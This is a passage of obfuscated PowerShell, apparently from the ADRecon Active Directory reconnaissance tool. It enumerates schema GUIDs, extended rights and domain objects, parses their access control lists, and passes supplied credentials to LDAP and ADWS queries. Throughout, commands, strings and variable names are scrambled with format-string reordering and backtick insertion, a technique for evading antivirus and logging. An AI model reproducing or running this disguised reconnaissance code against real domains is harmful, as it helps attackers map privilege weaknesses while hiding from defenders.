                                ${IN`iT} = ${t`RUE}
                                ${tR`A`N`SlaTE} = &("{0}{1}{2}" -f 'New-Obje','c','t') -ComObject ("{0}{1}{3}{2}" -f 'Name','T','ate','ransl')
                                If (${C`R`EDEntial} -ne   (vARiABle nk5P).ValUe::"em`pty")
                                {
                                    ${adsiNiTT`Y`Pe} = ${a`dS_`NAm`e_INitt`Y`pE_Do`main}
                                    Try
                                    {
                                         (  cHilDiTem  ('v'+'aR'+'IaB'+'L'+'E:F0S6I')  ).vAlUe.("{3}{0}{2}{1}"-f'vo','r','keMembe','In').Invoke(("{0}{2}{1}" -f 'Init','x','E'),("{0}{1}{2}"-f 'In','vokeMeth','od'),${N`UlL},${t`RAn`s`latE},$(@(${AdS`init`T`YpE},${domaI`Nfq`dn},(${CRede`N`TIAl}.("{4}{3}{0}{1}{2}" -f'de','n','tial','orkCre','GetNetw').Invoke())."U`SE`RNaME",${Do`MA`infQdN},(${cREd`Ent`I`AL}.("{3}{2}{1}{4}{0}"-f'tial','Net','t','Ge','workCreden').Invoke())."p`ASsWo`Rd")))
                                    }
                                    Catch
                                    {
                                        ${IN`It} = ${f`Alse}
                                        
                                        
                                    }
                                }
                                Else
                                {
                                    ${ADS`inIt`TyPe} = ${ad`S_N`AmE_`I`Nit`TYpE_Gc}
                                    Try
                                    {
                                          ( VArIaBle ('F0'+'S6I') -ValUeOnl  ).("{3}{1}{2}{0}"-f 'ber','okeM','em','Inv').Invoke(("{0}{1}"-f'In','it'),("{1}{2}{0}" -f'ethod','Invok','eM'),${NU`ll},${T`RaNSL`ATE},(${a`dSINItT`Y`pe},${nu`ll}))
                                    }
                                    Catch
                                    {
                                        ${i`NIT} = ${f`Al`Se}
                                        
                                        
                                    }
                                }
                                If (${In`It})
                                {
                                      (  GET-ITEm  vARiAble:f0s6I  ).VaLue.("{2}{0}{3}{1}"-f 'Me','ber','Invoke','m').Invoke(("{3}{2}{0}{1}" -f'eReferra','l','as','Ch'),("{3}{1}{2}{0}"-f 'erty','r','op','SetP'),${n`Ull},${T`Ra`N`slAtE},${a`ds`_ChasE_RE`FeRRaLs`_alWa`yS})
                                    Try
                                    {
                                          ( GET-VARIaBle ('F0S6'+'I')  ).VAlUe.("{2}{0}{1}"-f'mbe','r','InvokeMe').Invoke("Set",("{0}{2}{1}"-f 'In','Method','voke'),${N`ULL},${tra`NsL`ATE},(${Ad`S_N`AMe_`TypE`_uNk`NO`wN}, ${Tar`geT`SID}))
                                        ${aDSou`T`pUt} =  ( VArIAbLe  f0S6I -vAlueO ).("{0}{2}{1}" -f'I','ber','nvokeMem').Invoke("Get",("{2}{1}{0}"-f 'Method','e','Invok'),${n`Ull},${TRA`NSl`AtE},${a`DS`outp`UTTYPE})
                                    }
                                    Catch
                                    {
                                        
                                        
                                    }
                                }
                            }
                        }
                        If (-Not (  (  VarIaBLe ("h"+"wn23")  -vaLUeONLy )::("{0}{1}{3}{2}"-f 'IsN','u','OrEmpty','ll').Invoke(${a`ds`out`puT})) )
                        {
                            Return ${A`DsoU`Tp`Ut}
                        }
                        Else
                        {
                            Return ${tarGE`TS`iD}
                        }
                    }
                }
            }
            Catch
            {
                
                
            }
        }
        Else
        {
            Return ${TarG`Ets`ID}
        }
    }
}


Function g`e`T-ADraCl
{

    param(
        [Parameter(maNdAtory = ${T`Rue})]
        [string] ${mET`H`Od},

        [Parameter(MandAtORY = ${FA`L`Se})]
        [DirectoryServices.DirectoryEntry] ${OBJ`DO`MAin},

        [Parameter(maNDatOry = ${fA`LSE})]
        [string] ${Dom`A`iNconTR`oll`ER},

        [Parameter(mANDATory = ${fA`LsE})]
        [Management.Automation.PSCredential] ${C`R`eDe`NtIal} =  $nk5P::"E`mpTY",

        [Parameter(ManDAtorY = ${FA`L`se})]
        [bool] ${RE`SO`lve`sId} = ${fAL`sE},

        [Parameter(mANDaTOry = ${tr`Ue})]
        [int] ${p`Agesi`ZE},

        [Parameter(mandaToRY = ${FaL`sE})]
        [int] ${Th`Rea`DS} = 10
    )

    If (${ME`THOD} -eq ("{0}{1}" -f 'ADW','S'))
    {
        If (${c`Red`E`NTiAl} -eq   (chilDiTeM ('Va'+'riAB'+'LE:N'+'k5p') ).ValuE::"e`MpTY")
        {
            If (&("{2}{1}{0}{3}"-f '-Pa','st','Te','th') ("{1}{0}"-f 'D:','A'))
            {
                &("{2}{1}{0}"-f 'n','Locatio','Set-') ("{1}{0}" -f ':','AD')
            }
            Else
            {
                &("{2}{0}{1}" -f 'arnin','g','Write-W') ("{12}{6}{8}{14}{9}{13}{4}{11}{10}{3}{0}{7}{1}{5}{2}"-f 'ing A',' enumer','n','Skipp','t fo','atio','fa','CL','ult','A',' ... ','und','De','D drive no',' ')
                Return ${n`ULl}
            }
        }
        ${guI`dS} = @{("{10}{2}{6}{8}{4}{1}{3}{7}{9}{5}{0}" -f '0','0','0000-0000-00','0-000','0','000','00','0','-0','0000','0000') = 'All'}
        Try
        {
            &("{1}{2}{0}{3}" -f 's','Writ','e-Verbo','e') ("{1}{0}{3}{2}{4}" -f '] Enume','[*',' schemaID','rating','s')
            ${sc`he`m`AiDs} = &("{3}{0}{2}{1}"-f 'O','ect','bj','Get-AD') -SearchBase (&("{3}{0}{2}{1}" -f 't-AD','otDSE','Ro','Ge'))."SC`hE`MAN`A`MIngc`onText" -LDAPFilter ("{1}{0}{4}{2}{3}" -f 'sc','(','U','ID=*)','hemaIDG') -Properties ("{1}{0}"-f 'ame','n'), ("{2}{0}{1}{3}"-f 'maI','DGU','sche','ID')
        }
        Catch
        {
            &("{1}{0}{2}" -f 'ri','W','te-Warning') ("{9}{11}{3}{2}{1}{6}{10}{7}{4}{0}{8}{5}"-f 'sch','Error ','RACL] ','D','ting ','Ds','while e','mera','emaI','[','nu','Get-A')
            &("{3}{0}{1}{2}" -f'e-V','e','rbose','Writ') "[EXCEPTION] $($_.Exception.Message) "
        }

        If (${sChE`m`A`idS})
        {
            ${S`c`HEMa`IdS} | &("{1}{0}{2}{3}"-f'her','W','e-Obje','ct') {${_}} | &("{1}{2}{3}{4}{0}"-f 't','Fo','rEac','h-Obje','c') {
                
                ${G`U`IDS}[(&("{0}{1}{3}{2}"-f 'N','e','bject','w-O') ("{1}{0}" -f'uid','G') (,${_}."SCH`emaidG`UID"))."gu`iD"] = ${_}."NA`mE"
            }
            &("{2}{1}{0}"-f 'e','bl','Remove-Varia') ("{2}{1}{0}"-f'Ds','chemaI','s')
        }

        Try
        {
            &("{0}{3}{4}{2}{1}"-f'W','bose','r','ri','te-Ve') ("{4}{7}{6}{5}{0}{2}{1}{3}" -f' Directory Ri','ht','g','s','[*] E',' Active','umerating','n')
            ${SCH`emAI`dS} = &("{0}{1}{2}{3}" -f'G','et','-ADObje','ct') -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{1}{2}{0}{4}{3}{5}"-f 'R','(objectClass','=controlAccess','h','ig','t)') -Properties ("{1}{0}" -f'e','nam'), ("{1}{0}{2}"-f'htsGU','rig','ID')
        }
        Catch
        {
            &("{1}{2}{0}" -f'ng','Writ','e-Warni') ("{5}{6}{8}{3}{4}{0}{2}{7}{9}{1}{10}" -f'or while enumerating Active ','gh','D',' Er','r','[Get-A','DR','irectory','ACL]',' Ri','ts')
            &("{1}{0}{2}{3}"-f'rit','W','e-Verbos','e') "[EXCEPTION] $($_.Exception.Message) "
        }

        If (${ScheM`A`IDs})
        {
            ${S`Che`MaIDS} | &("{3}{2}{0}{1}" -f 'e-Ob','ject','her','W') {${_}} | &("{2}{0}{1}"-f 'Each-Obj','ect','For') {
                
                ${GUI`ds}[(&("{0}{2}{1}"-f 'New-Obj','t','ec') ("{0}{1}" -f'Gu','id') (,${_}."ri`GHtSG`UID"))."G`UId"] = ${_}."NA`ME"
            }
            &("{3}{4}{2}{0}{1}"-f 'b','le','-Varia','Remov','e') ("{0}{1}{2}" -f 'sc','he','maIDs')
        }

        
        ${OB`jS} = @()
        Try
        {
            ${ADD`o`m`AIn} = &("{1}{3}{2}{0}"-f'ADDomain','Ge','-','t')
        }
        Catch
        {
            &("{0}{1}{2}{3}" -f'Wri','te-','War','ning') ("{0}{4}{2}{6}{3}{1}{5}"-f '[Get-A','ain Conte','rror getti','g Dom','DRACL] E','xt','n')
            &("{0}{4}{1}{2}{3}"-f'W','t','e-Verbo','se','ri') "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            &("{3}{1}{2}{0}" -f 'se','Verb','o','Write-') ("{0}{3}{7}{6}{4}{1}{9}{10}{2}{11}{8}{5}"-f'[*] ','OU, G',', C','Enumeratin','n, ','bjects','Domai','g ','roup O','PO, Use','r','omputer and G')
            ${oB`jS} += &("{0}{1}{2}"-f 'Get-','ADObje','ct') -LDAPFilter ((("{3}{12}{29}{25}{7}{39}{41}{6}{11}{36}{27}{10}{48}{21}{4}{40}{37}{17}{24}{15}{43}{13}{1}{28}{9}{16}{46}{20}{14}{42}{2}{23}{32}{26}{18}{8}{31}{30}{34}{45}{44}{19}{5}{47}{38}{22}{35}{33}{0}"-f'13))','=80','pe=8053','(MZb(','g','91','gory=or',')(','435456','636','it)(objec','ganizatio','ob','untType','ou','Co','8)(','Po','8','0','Acc','gory=','maccounttype=','06','licy','in','nttype=26','alun','530','jectClass=doma','457)(',')(samaccounttype=268435','369)(samaccou','9','samacco','536870','n','oup','a','obje','r','ctCate','ntTy','ntainer)(samAcco','687','unttype=53','sam','2)(s','tCate'))-CREPLaCe ([ChAr]77+[ChAr]90+[ChAr]98),[ChAr]124) -Properties ("{0}{2}{1}"-f'Displa','Name','y'), ("{5}{1}{3}{0}{2}{4}" -f'ngui','ist','shedNam','i','e','D'), ("{0}{1}" -f'Nam','e'), ("{1}{2}{4}{0}{3}"-f'rip','n','tsecu','tor','ritydesc'), ("{1}{0}{2}" -f 'bjectCla','O','ss'), ("{2}{1}{0}"-f 'jectsid','b','o')
        }
        Catch
        {
            &("{1}{2}{0}" -f 'ng','Write-W','arni') ("{8}{2}{15}{3}{12}{0}{13}{7}{1}{9}{10}{6}{4}{11}{14}{5}" -f' ',', ','RACL] Error w','enumerat','o','jects','Computer and Gr','GPO','[Get-AD','User,',' ','u','ing Domain,','OU, ','p Ob','hile ')
            &("{2}{0}{4}{3}{1}"-f 'Ver','e','Write-','os','b') "[EXCEPTION] $($_.Exception.Message) "
        }

        If (${A`DDoMAIn})
        {
            Try
            {
                &("{2}{0}{1}{3}" -f'rite','-Verb','W','ose') ("{1}{4}{7}{0}{2}{6}{10}{8}{9}{5}{3}" -f 'ing Root','[*',' Conta','s','] Enumera','ect','in','t',' ','Obj','er')
                ${ob`jS} += &("{2}{3}{1}{0}" -f't','bjec','Get-A','DO') -SearchBase $(${A`dDOM`AiN}."dIst`iNG`UIshed`Name") -SearchScope ("{1}{0}{2}"-f 'eLev','On','el') -LDAPFilter (("{6}{7}{1}{5}{0}{2}{4}{3}"-f'conta','ec','in',')','er','tClass=','(','obj')) -Properties ("{0}{3}{2}{1}" -f'D','ishedName','tingu','is'), ("{1}{0}" -f 'ame','N'), ("{0}{3}{2}{1}{4}"-f 'nts','t','ri','ecu','ydescriptor'), ("{0}{2}{1}{3}"-f'Ob','ctCl','je','ass')
            }
            Catch
            {
                &("{2}{3}{4}{1}{0}" -f'ng','ni','Wr','it','e-War') ("{0}{3}{7}{6}{1}{4}{8}{5}{2}{9}" -f '[Get-','e enume','ainer Object','ADRACL] ','rating Root','t','il','Error wh',' Con','s')
                &("{3}{1}{0}{2}"-f 'os','-Verb','e','Write') "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If (${OB`Js})
        {
            ${a`C`LoBj} = @()
            &("{0}{4}{1}{3}{2}" -f 'Wri','-V','e','erbos','te') "[*] Total Objects: $([ADRecon.ADWSClass]::ObjectCount($Objs)) "
            &("{0}{3}{2}{1}{4}"-f'W','os','erb','rite-V','e') ("{0}{2}{1}" -f '[-]','s',' DACL')
            ${da`C`LobJ} =   (cHilDiTEm  VaRIaBle:iT3v9E).vaLUe::("{1}{2}{0}"-f'rser','DACL','Pa').Invoke(${OB`JS}, ${gU`I`Ds}, ${thRE`ADs})
            
            &("{2}{3}{1}{0}"-f '-Warning','ite','W','r') ("{11}{12}{5}{8}{4}{0}{10}{1}{3}{9}{7}{2}{6}"-f 'he',' is ','LDAP','on','y, t','ent','.','y supported with ','l','l',' module','[*] SAC','Ls - Curr')
            
            &("{0}{3}{1}{4}{2}" -f'Remove-V','ia','e','ar','bl') ("{1}{0}" -f'bjs','O')
            &("{0}{2}{1}{3}" -f 'Remo','l','ve-Variab','e') ("{0}{1}"-f'GUID','s')
        }
    }

    If (${mE`Thod} -eq ("{0}{1}"-f 'L','DAP'))
    {
        ${Gu`idS} = @{("{8}{1}{4}{0}{2}{7}{9}{6}{10}{3}{5}"-f'-00','0000','00-0','00000','000-0000','00000','-','00','0','0','00') = 'All'}

        If (${crE`d`ENtiaL} -ne  ( Item ('VARiABL'+'E:nK'+'5'+'p') ).VaLUE::"E`mPTy")
        {
            ${dOM`AiN`FQ`dN} = &("{3}{0}{1}{2}"-f '-DN','t','oFQDN','Get')(${O`BJdoM`AIN}."Di`Sti`NgUiSHe`dn`AME")
            ${D`omaIn`CoN`TeXt} = &("{1}{3}{0}{2}"-f 'je','New','ct','-Ob') ("{12}{3}{5}{6}{13}{1}{8}{0}{7}{9}{14}{10}{4}{2}{11}"-f'.Acti','rvice','tex','em','.DirectoryCon','.Dire','ct','v','s','eD','ory','t','Syst','orySe','irect')(("{1}{0}"-f 'omain','D'),$(${dO`m`A`infqDN}),$(${C`R`ed`EnTiaL}."U`SeR`NaME"),$(${C`R`EDentIaL}.("{0}{1}{5}{4}{6}{3}{2}" -f'GetNet','wo','l','entia','Cre','rk','d').Invoke()."P`Ass`WOrD"))
            Try
            {
                ${aD`DoMAIN} =   ( gET-ChilDITeM ("V"+"ARiable:"+"l"+"b"+"FUd2")).vAluE::("{2}{1}{0}"-f'n','mai','GetDo').Invoke(${D`O`ma`In`cONTexT})
            }
            Catch
            {
                &("{1}{3}{0}{2}"-f'n','Wr','g','ite-Warni') ("{7}{5}{8}{4}{0}{1}{9}{2}{3}{6}"-f'getting ','Do',' C','o','or ','-ADRA','ntext','[Get','CL] Err','main')
                &("{3}{1}{2}{0}"-f'se','t','e-Verbo','Wri') "[EXCEPTION] $($_.Exception.Message) "
            }

            Try
            {
                ${fO`Rest`C`ont`eXT} = &("{2}{1}{0}"-f 'ct','ew-Obje','N') ("{9}{5}{10}{3}{8}{7}{1}{11}{13}{6}{4}{12}{2}{0}{14}" -f 'x','eDir','e','orySer','tory','m.','Direc','iv','vices.Act','Syste','Direct','ect','Cont','ory.','t')(("{0}{1}" -f'Fo','rest'),$(${a`Ddom`AiN}."f`orEst"),$(${cR`E`DENTIAl}."USern`A`mE"),$(${C`REDEnt`Ial}.("{0}{2}{3}{4}{1}"-f'GetNetwor','ential','kC','re','d').Invoke()."PA`SSw`ord"))
                ${ADf`Ore`st} =  ( LS  VarIable:ydLZcG ).valuE::("{0}{1}{2}" -f 'Get','Fores','t').Invoke(${FOrE`S`Tc`ONtEXt})
                ${s`chemap`A`Th} = ${Ad`FO`Rest}."sch`EmA"."N`AME"
                &("{2}{3}{0}{4}{1}"-f 'ove-','ble','R','em','Varia') ("{0}{1}"-f'ADFores','t')
            }
            Catch
            {
                &("{3}{2}{0}{1}" -f'rn','ing','Wa','Write-') ("{4}{10}{1}{5}{7}{8}{2}{0}{12}{11}{3}{6}{9}"-f 'ror e','e','] Er','Sch','[','t-','emaP','A','DRACL','ath','G','ing ','numerat')
                &("{2}{4}{0}{1}{3}" -f 'ite','-','W','Verbose','r') "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            ${Add`o`MaIN} =   (GET-VArIABLE LbfUD2  ).value::("{3}{1}{0}{2}" -f'entDo','etCurr','main','G').Invoke()
            ${a`DFoR`est} =   (gET-vArIABLe ("Y"+"d"+"LZCG") -VAlu)::("{0}{1}{2}{3}"-f'GetC','urrentF','ores','t').Invoke()
            ${s`chEMAP`ATh} = ${aDFo`R`ESt}."SCHe`MA"."N`Ame"
            &("{1}{3}{0}{2}" -f 'a','R','riable','emove-V') ("{1}{2}{0}" -f 'st','ADF','ore')
        }

        If (${scH`e`m`APAth})
        {
            &("{0}{1}{2}{3}"-f 'Write-V','erb','os','e') ("{2}{1}{0}{6}{3}{4}{5}"-f'ra','me','[*] Enu','g',' ','schemaIDs','tin')
            If (${CReD`E`N`TIal} -ne   $NK5P::"eM`PtY")
            {
                ${Ob`J`SeaRC`h`PATh} = &("{2}{3}{0}{1}"-f'j','ect','N','ew-Ob') ("{4}{6}{0}{3}{1}{2}{5}" -f'recto','ces','.DirectoryE','ryServi','System.','ntry','Di') "LDAP://$($DomainController)/$($SchemaPath)", ${CR`eDe`Nt`ial}."usERN`AMe",${c`RE`DeNtIal}.("{3}{0}{4}{1}{2}" -f 'rkCr','den','tial','GetNetwo','e').Invoke()."P`AssWO`RD"
                ${OBJsE`A`RCHe`RpaTh} = &("{2}{0}{1}" -f'bjec','t','New-O') ("{2}{0}{7}{6}{1}{3}{4}{5}"-f'rectorySe','Se','System.Di','arch','e','r','Directory','rvices.') ${O`BJsEa`RcHp`ATH}
            }
            Else
            {
                ${ob`jsEaRch`eR`P`AtH} = &("{1}{0}{2}"-f 'ew','N','-Object') ("{2}{5}{3}{6}{0}{4}{1}"-f 'ervices.','Searcher','System.Di','ct','Directory','re','oryS') ([ADSI] "LDAP://$($SchemaPath)")
            }
            ${o`B`j`SeAR`chErPa`TH}."p`AGesIzE" = ${pAGES`i`ze}
            ${o`B`jsEA`RcHER`PATH}."fI`Lt`eR" = ("{3}{0}{2}{1}{4}"-f 'a','UID=','IDG','(schem','*)')

            Try
            {
                ${Sc`hE`MaseArc`Her} = ${ob`jse`ArchEr`pa`TH}.("{1}{0}"-f'dAll','Fin').Invoke()
            }
            Catch
            {
                &("{2}{1}{0}{3}{4}" -f'n','r','Write-Wa','i','ng') ("{5}{3}{4}{6}{1}{0}{2}" -f'ing Schem','or enumerat','aIDs','-ADRACL','] Er','[Get','r')
                &("{0}{2}{1}" -f'Write-V','ose','erb') "[EXCEPTION] $($_.Exception.Message) "
            }

            If (${sChEm`A`Sear`CHer})
            {
                ${S`CHe`M`ASEARCh`Er} | &("{1}{2}{3}{0}" -f't','W','he','re-Objec') {${_}} | &("{1}{2}{0}{3}"-f 'ach-Obje','Fo','rE','ct') {
                    
                    ${gui`DS}[(&("{2}{0}{1}" -f 'Obje','ct','New-') ("{0}{1}" -f'G','uid') (,${_}."Pr`O`peRTIeS"."SChEmA`i`D`GUId"[0]))."g`UID"] = ${_}."pRo`perTi`eS"."NA`mE"[0]
                }
                ${s`cHEMAseaRCh`er}.("{2}{0}{1}" -f's','e','dispo').Invoke()
            }
            ${OB`JSeArcH`ErpaTh}.("{0}{1}"-f'disp','ose').Invoke()

            &("{2}{1}{0}"-f'ose','erb','Write-V') ("{6}{4}{10}{1}{5}{8}{2}{9}{3}{0}{7}"-f 'h','rat','ctory','g','n','ing ','[*] E','ts','Active Dire',' Ri','ume')
            If (${crEDEnT`I`AL} -ne  (  Gi  VArIaBle:NK5P  ).valUe::"EM`pty")
            {
                ${ob`J`sear`cHpAth} = &("{0}{2}{1}"-f 'New-O','ct','bje') ("{3}{0}{11}{8}{10}{1}{2}{9}{7}{6}{5}{4}"-f 'e','ices','.Dir','Syst','try','En','y','r','torySe','ecto','rv','m.Direc') (("LDAP://$($DomainController)/$($SchemaPath.replace("Schema","Extended-Rights"))")), ${CRE`dE`N`TIal}."u`seRna`me",${cRED`ENT`iAl}.("{1}{0}{2}{3}" -f 'e','G','tNetworkCreden','tial').Invoke()."p`Ass`wORd"
                ${o`Bjs`EaRCH`erpAth} = &("{1}{2}{0}"-f'ject','New','-Ob') ("{1}{9}{5}{7}{6}{8}{0}{2}{4}{3}{10}" -f'vices.','Sy','Dir','ySea','ector','.Dir','ySe','ector','r','stem','rcher') ${obJ`sea`RCHPAth}
            }
            Else
            {
                ${objs`eArc`H`E`RpATh} = &("{2}{1}{0}"-f 'w-Object','e','N') ("{2}{5}{7}{11}{8}{6}{1}{9}{3}{10}{4}{0}"-f 'her','rvices.D','Sy','rect','c','ste','rySe','m.Dire','to','i','orySear','c') ([ADSI] (("LDAP://$($SchemaPath.replace("Schema","Extended-Rights"))")))
            }
            ${ObJSe`A`R`ChERP`A`Th}."PaGE`Si`ze" = ${P`A`gesIze}
            ${ObjS`EA`Rc`herPA`Th}."F`i`lTER" = (("{6}{3}{0}{2}{5}{4}{7}{1}" -f 'contr','ight)','ol','tClass=','ss','Acce','(objec','R'))

            Try
            {
                ${ri`GhT`sSEar`ChER} = ${Ob`jSEAR`Che`RPaTh}.("{1}{0}"-f 'dAll','Fin').Invoke()
            }
            Catch
            {
                &("{3}{1}{0}{2}" -f 'a','te-W','rning','Wri') ("{11}{5}{0}{4}{1}{9}{6}{2}{12}{7}{8}{10}{3}"-f 'DR',' Error','g A','Rights','ACL]','et-A','numeratin','ive D','i',' e','rectory ','[G','ct')
                &("{0}{1}{2}"-f 'Wr','ite-Ve','rbose') "[EXCEPTION] $($_.Exception.Message) "
            }

            If (${r`igHtSsE`A`RcH`er})
            {
                ${RI`g`htsSe`ArCh`eR} | &("{3}{0}{2}{1}"-f'ere-O','t','bjec','Wh') {${_}} | &("{3}{2}{1}{0}"-f'ct','ach-Obje','E','For') {
                    
                    ${G`U`iDs}[${_}."Pr`OPeR`TiES"."rI`GH`TS`GUiD"[0].("{2}{1}{0}" -f 'tring','S','to').Invoke()] = ${_}."PRo`peRti`Es"."na`Me"[0]
                }
                ${rigH`Ts`s`E`ARCHER}.("{1}{0}"-f 'spose','di').Invoke()
            }
            ${o`B`jSeArCHERP`AtH}.("{2}{1}{0}"-f'e','s','dispo').Invoke()
        }

        
        ${o`BjS} = @()
        &("{0}{1}{3}{2}" -f 'W','rite-V','bose','er') ("{2}{6}{15}{9}{16}{1}{11}{14}{4}{8}{13}{5}{7}{0}{12}{3}{10}"-f' Obj',' OU, G','[','t','mp','n','*]','d Group','ut','o','s','P','ec','er a','O, User, Co',' Enumerating D','main,')
        ${obJSE`ARcH`Er} = &("{0}{3}{1}{2}" -f 'New','Obje','ct','-') ("{0}{6}{1}{7}{5}{4}{3}{2}"-f 'Sys','.Di','her','c','ar','ectorySe','tem.DirectoryServices','r') ${Ob`JDo`MaIn}
        ${oBjS`e`Ar`Cher}."p`A`GeSIZE" = ${p`AGEs`IZE}
        ${OB`j`SE`ARCheR}."fIL`TEr" = ((("{8}{33}{47}{4}{24}{31}{30}{15}{7}{1}{53}{32}{26}{56}{0}{25}{23}{55}{27}{45}{5}{44}{41}{6}{12}{10}{20}{28}{3}{22}{16}{48}{37}{52}{39}{11}{51}{17}{13}{38}{40}{49}{36}{42}{21}{9}{50}{35}{43}{46}{18}{29}{2}{19}{54}{14}{34}" -f 'ry=groupPolic',')',')(samaccou','69','bjectCatego','pe=805','samA','it','({0}(objectClass','43','=','56','ccountType','ama','1','nalun','co','(s','36','nttype=536870','805306','=268',')(samac',')(samAc','r','yContainer','ectCate','unt','3','870912','o','y=organizati','j','=doma','3))','sam','untt','ntt','c','2684354','c','06368)(','ype','acc','3','Ty','ounttype=5','in)(o','u','o','5457)(',')','ype=','(ob','9','co','go')) -F[cHaR]124)
        
        ${O`Bj`seARCHEr}."sECURITy`M`A`S`KS" =  (GEt-vARiAblE gxf  -vAlueon)::"D`ACL" -bor  $Gxf::"g`ROuP" -bor   (  ItEM  VaRiaBLe:GXF ).Value::"O`WNER" -bor  ( GEt-VaRiaBle  gxF ).valUe::"SA`CL"
        ${obJ`sE`A`RCHEr}."PrOPERt`I`eST`oLo`AD".("{1}{2}{0}"-f'ge','Add','Ran').Invoke((("{1}{2}{0}{3}"-f'aynam','di','spl','e'),("{3}{4}{0}{2}{1}"-f'ishedn','me','a','dist','ingu'),("{1}{0}"-f'ame','n'),("{3}{0}{1}{2}" -f'securit','yd','escriptor','nt'),("{0}{1}{2}{3}"-f'ob','je','ct','class'),("{3}{2}{1}{0}" -f 'd','i','s','object')))
        ${ObJSea`R`C`hER}."s`EArCHsco`pE" = ("{1}{2}{0}" -f'e','Subt','re')

        Try
        {
            ${o`BJs} += ${o`BJ`SearchER}.("{1}{0}" -f 'll','FindA').Invoke()
        }
        Catch
        {
            &("{2}{4}{3}{0}{1}"-f'n','ing','Write','War','-') ("{15}{0}{14}{3}{4}{13}{16}{2}{6}{8}{10}{7}{9}{17}{12}{1}{5}{11}" -f'o',' Obj','o','le en','u','e','main, OU, ','Use','GPO,','r, Com',' ','cts','er and Group','mera','r whi','[Get-ADRACL] Err','ting D','put')
            &("{1}{2}{0}"-f'bose','Wri','te-Ver') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${OB`jSE`A`RcHER}.("{2}{0}{1}" -f 'o','se','disp').Invoke()

        &("{2}{1}{0}" -f'e','Verbos','Write-') ("{1}{6}{2}{0}{3}{4}{5}"-f 'Root Cont','[','erating ','ain','er O','bjects','*] Enum')
        ${Ob`jsE`ArCheR} = &("{3}{0}{2}{1}"-f'w-','ject','Ob','Ne') ("{11}{9}{1}{2}{8}{7}{0}{5}{3}{4}{6}{10}" -f 'es.Direc','irect','orySer','ory','Searc','t','h','c','vi','em.D','er','Syst') ${ob`jDO`maIn}
        ${o`BjsE`ArChER}."p`AGe`Size" = ${P`AGE`SiZe}
        ${obJse`Ar`ChEr}."fi`lTEr" = (("{4}{0}{1}{3}{5}{2}" -f'as','s=','er)','con','(objectCl','tain'))
        
        ${ob`Jse`AR`cHeR}."sE`cU`RiT`Ymas`ks" = ${oBJ`SeAR`CH`ER}."sEcu`RiTY`ma`s`ks" =  $gXf::"dA`Cl" -bor   (  Get-VaRIablE ("G"+"xF")).valUe::"gr`OUp" -bor  $GXf::"OW`NER" -bor   (  GI  VARIaBLE:gxF  ).VALuE::"Sa`cL"
        ${oBJS`E`ARc`Her}."pR`o`PertieSToLOad".("{0}{2}{1}" -f 'Add','ange','R').Invoke((("{0}{3}{1}{2}"-f'di','inguished','name','st'),("{1}{0}"-f 'e','nam'),("{1}{0}{2}{3}" -f 'curitydescr','ntse','i','ptor'),("{1}{0}{2}"-f'cl','object','ass')))
        ${OB`J`sEARcheR}."sear`CHS`coPe" = ("{0}{2}{1}" -f'OneL','el','ev')

        Try
        {
            ${o`Bjs} += ${oBjSEA`R`CheR}.("{0}{1}" -f 'Fin','dAll').Invoke()
        }
        Catch
        {
            &("{2}{1}{0}{3}"-f'e','t','Wri','-Warning') ("{0}{1}{7}{3}{8}{9}{2}{5}{6}{4}" -f'[Ge','t-ADR','er','or','r Objects','ating Root ','Containe','ACL] Err',' while enu','m')
            &("{0}{2}{1}" -f'Write','rbose','-Ve') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${O`BjS`EArC`hER}.("{1}{2}{0}" -f'ose','di','sp').Invoke()

        If (${Ob`Js})
        {
            &("{0}{1}{3}{2}"-f 'W','rite-V','e','erbos') "[*] Total Objects: $([ADRecon.LDAPClass]::ObjectCount($Objs)) "
            &("{1}{0}{2}"-f'e-Ver','Writ','bose') ("{2}{1}{0}"-f'ACLs','D','[-] ')
            ${d`Ac`LobJ} =  ( VaRiAblE  D761P  -va)::("{0}{2}{1}"-f'D','er','ACLPars').Invoke(${OB`JS}, ${gU`i`DS}, ${Th`REA`Ds})
            &("{4}{0}{2}{1}{3}" -f'-','erb','V','ose','Write') ("{7}{4}{9}{0}{1}{6}{11}{8}{3}{2}{10}{5}" -f ' -',' May nee',' Acco','ed','-] S','nt','d a Priv','[','leg','ACLs','u','i')
            ${Sa`cl`obJ} =  (variablE d761p -VaL )::("{1}{2}{3}{0}"-f 'r','SA','CLPa','rse').Invoke(${O`BJS}, ${G`Ui`Ds}, ${th`RE`ADS})
            &("{2}{0}{1}" -f 'ove-Va','riable','Rem') ("{0}{1}"-f'Ob','js')
            &("{2}{1}{4}{0}{3}" -f'bl','m','Re','e','ove-Varia') ("{1}{0}" -f'UIDs','G')
        }
    }

    If (${DaC`L`OBj})
    {
        &("{1}{2}{0}"-f'rt-ADR','Exp','o') ${DA`c`lOBJ} ${a`Drou`T`p`Utdir} ${OuTP`Ut`TypE} ("{0}{1}" -f'D','ACLs')
        &("{2}{1}{0}{3}" -f 'ria','emove-Va','R','ble') ("{2}{0}{1}" -f 'CL','Obj','DA')
    }

    If (${SA`C`LoBJ})
    {
        &("{0}{2}{1}"-f'Expor','DR','t-A') ${S`ACLobj} ${adR`OuTPuTD`Ir} ${OUT`pUTty`Pe} ("{1}{0}"-f 's','SACL')
        &("{1}{3}{2}{0}"-f'le','Re','ab','move-Vari') ("{1}{0}" -f 'bj','SACLO')
    }
}

Function GE`T-A`d`Rg`PorEpORt
{

    param(
        [Parameter(MANDAtoRy = ${TR`UE})]
        [string] ${M`eT`HOD},

        [Parameter(MaNdAToRy = ${tR`UE})]
        [bool] ${USE`A`ltcR`eds},

        [Parameter(MANDAtoRy = ${T`RUE})]
        [string] ${ADR`oU`T`pUtd`Ir}
    )

    If (${m`E`ThOd} -eq ("{0}{1}" -f 'A','DWS'))
    {
        Try
        {
            
            ${S`A`V`EvE`RBOs`epreF`eReNcE} = ${scRIpT:`V`eRBo`S`eP`Re`FEre`NCe}
            ${sCr`Ipt`:VerB`OSEpRef`EReNCe} = ("{3}{4}{0}{1}{2}" -f 'ntly','Con','tinue','Si','le')
